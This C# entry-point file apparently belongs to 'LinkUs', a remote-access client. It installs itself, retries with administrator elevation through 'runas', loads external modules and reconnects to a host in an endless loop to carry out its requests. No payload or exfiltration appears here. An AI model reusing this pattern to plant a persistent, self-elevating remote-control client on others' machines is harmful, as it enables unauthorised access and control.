using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;
using LinkUs.Client.ClientInformation;
using LinkUs.Client.Infrastructure;
using LinkUs.Client.Install;
using LinkUs.Client.Modules;
using LinkUs.Core;
using LinkUs.Core.Commands;
using LinkUs.Core.Connection;
using LinkUs.Core.Packages;

namespace LinkUs.Client
{
    class Program
    {
        private static readonly Ioc Ioc = BuildIoc();

        static void Main(string[] args)
        {
            if (args.Any(x => x == "--debug")) {
                AllocConsole();
                AttachConsole((uint) Process.GetCurrentProcess().Id);
                LoadModules();
                FindHostAndProcessRequests();
                FreeConsole();
                return;
            }

            try {
                InitializeClient();
            }
            catch (UnauthorizedAccessException) {
                if (TryRestartApplicationWithAdministratorPrivileges()) {
                    // We succeded to start a new process in admin mode
                    // we can quit.
                    Environment.Exit(0);
                }
                else {
                    // We failed to start the process in admin mode, we start
                    // the client
                }
            }

            LoadModules();
            FindHostAndProcessRequests();
        }

        // ----- Internal logics
        private static void InitializeClient()
        {
            var installer = Ioc.GetInstance<Installer>();
            var env = Ioc.GetInstance<IEnvironment>();
            var exeFilePath = installer.GetCurrentInstalledApplicationPath();
            if (string.IsNullOrEmpty(exeFilePath)) {
                installer.Install();
            }
            else if (string.Equals(exeFilePath, env.ApplicationPath, StringComparison.InvariantCultureIgnoreCase)) {
                // do nothing                
            }
            else {
                throw new NotImplementedException("another client is installed");
            }
        }
        private static void LoadModules()
        {
            var moduleManager = Ioc.GetInstance<ModuleManager>();
            moduleManager.LoadModules();
        }
        private static void FindHostAndProcessRequests()
        {
            while (true) {
                var connection = FindAvailableHost();
                try {
                    ProcessRequests();
                }
                catch (Exception ex) {
                    Console.WriteLine(ex);
                }
                finally {
                    connection.Close();
                    Ioc.UnregisterSingle<IConnection>();
                }
                Thread.Sleep(1000);
            }
        }
        private static IConnection FindAvailableHost()
        {
            var serverBrowser = Ioc.GetInstance<ServerBrowser>();
            var connection = serverBrowser.SearchAvailableHost();
            Ioc.RegisterSingle(connection);
            return connection;
        }
        private static void ProcessRequests()
        {
            var commandSender = Ioc.GetInstance<ICommandSender>();
            commandSender.ExecuteAsync(new SetStatus { Status = "Provider" });

            var requestProcessor = Ioc.GetInstance<RequestProcessor>();
            requestProcessor.ProcessRequests();
        }
        private static bool TryRestartApplicationWithAdministratorPrivileges()
        {
            try {
                var exeName = Process.GetCurrentProcess().MainModule.FileName;
                StartExecutableWithAdministratorPrivileges(exeName);
                return true;
            }
            catch (Win32Exception) {
                return false;
            }
        }
        private static void StartExecutableWithAdministratorPrivileges(string filePath)
        {
            var startInfo = new ProcessStartInfo(filePath) {
                Verb = "runas"
            };
            Process.Start(startInfo);
        }

        // ----- Utils
        private static Ioc BuildIoc()
        {
            var ioc = new Ioc();
            ioc.RegisterSingle<ModuleManager>();
            ioc.Register<RequestProcessor>();
            ioc.Register<PackageParser>();
            ioc.Register<PackageTransmitter>();
            ioc.Register<PackageProcessor>();
            ioc.Register<ICommandSerializer, JsonCommandSerializer>();
            ioc.Register<ExternalAssemblyModuleLocator>();
            ioc.Register<ExternalAssemblyModuleScanner>();
            ioc.Register<IModuleFactory<ExternalAssemblyModule>, ExternalAssemblyModuleFactory>();
            ioc.Register<ServerBrowser>();
            ioc.Register<ICommandSender, CommandSender>();
            ioc.Register<AssemblyHandlerScanner>();
            ioc.RegisterSingle(new SocketAsyncOperationPool(10));
            ioc.RegisterSingle<Connector>();
            ioc.RegisterSingle<IRegistry, WindowsRegistry>();
            ioc.RegisterSingle<IFileService, FileService>();
            ioc.RegisterSingle<IEnvironment, ClientEnvironment>();
            return ioc;
        }

        // ----- Dll Import
        [DllImport("kernel32.dll")]
        private static extern bool AllocConsole();
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool AttachConsole(uint dwProcessId);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern bool FreeConsole();
    }
}